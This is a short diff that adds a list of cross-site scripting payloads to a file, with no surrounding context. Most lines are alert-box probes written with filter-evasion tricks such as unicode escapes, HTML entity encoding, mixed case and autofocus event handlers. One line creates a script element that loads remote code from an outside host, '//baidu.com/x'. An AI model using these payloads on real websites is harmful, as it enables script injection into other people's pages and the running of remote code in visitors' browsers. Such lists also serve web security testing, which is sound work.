@@ -1,0 +1,9 @@
+<script >alert(/XSSTEST/)</script>
+alert(/XSSTEST/);//
+"><img/src/onerrOr=prompt()>
+")><input onfocus=\u0061lert`XSSTEST`>
+")><input/onfocus=\u0061lert`XSSTEST`>
+<input onfocus=s=createElement('\x73cript');body.appendChild(s);s.src='//baidu.com/x'; autofocus>
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#47;&#72;&#73;&#72;&#73;&#72;&#73;&#47;&#41;">
+<q/oncut=alert(1)>
+<img src=x onerror=top['alert'](1)>
